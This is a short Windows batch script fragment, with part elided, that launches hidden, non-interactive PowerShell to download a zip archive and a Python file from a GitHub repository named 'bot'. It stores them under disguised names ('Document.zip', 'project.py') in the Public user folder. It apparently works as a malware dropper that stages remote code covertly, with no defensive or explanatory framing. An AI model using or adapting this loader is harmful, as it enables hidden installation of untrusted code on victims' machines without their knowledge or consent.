if not exist "C:\Users\Public\Document.zip" (
    powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/sirvnvu/bot/raw/main/PythonLib.zip' -OutFile 'C:\Users\Public\Document.zip'"
)
...
if not exist "C:\Users\Public\Document\project.py" (
    powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/sirvnvu/bot/raw/main/project.py' -OutFile 'C:\Users\Public\Document\project.py'"
)
